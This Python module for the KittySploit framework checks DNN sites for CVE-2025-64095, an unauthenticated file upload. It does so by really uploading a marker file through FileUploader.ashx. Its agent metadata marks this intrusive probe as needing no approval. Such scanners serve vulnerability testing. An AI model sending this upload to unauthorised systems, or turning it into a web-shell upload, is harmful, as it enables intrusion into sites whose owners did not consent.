#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DNN - Unrestricted Arbitrary File Upload"""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "DNN - Unrestricted Arbitrary File Upload",
        "description": (
            "DNN < 10.1.1 allows unauthenticated uploads via "
            "HtmlEditorProviders FileUploader.ashx."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-64095",
        "tags": ["web", "scanner", "cve", "cve2025", "vuln", "dnn", "file-upload", "vkev", "intrusive"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
        },
        "references": [
            "https://github.com/h4x0r-dz/CVE-2025-64095---DNN-Unauthenticated-arbitrary-file-upload",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-64095",
        ],
    }

    def run(self):
        filename = secrets.token_hex(3)
        marker = secrets.token_hex(8)
        boundary = "------------------------7RKjWLYyrhvUn2AA31fJQ3"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}.png"\r\n'
            "Content-Type: image/png\r\n\r\n"
            f"{marker}\r\n"
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="storageFolderID"\r\n\r\n'
            "1\r\n"
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="portalID"\r\n\r\n'
            "0\r\n"
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="overrideFiles"\r\n\r\n'
            "1\r\n"
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="mode"\r\n\r\n'
            "Default\r\n"
            f"--{boundary}--"
        )
        path = "/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx"
        r = self.http_request(
            method="POST",
            path=path,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            data=body,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        text = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "text/plain" not in ctype:
            return False
        if '{"group"' not in text or "delete_type" not in text:
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2025-64095",
            reason="DNN FileUploader.ashx accepted unauthenticated upload",
            path=path,
            confidence="high",
        )
        return True
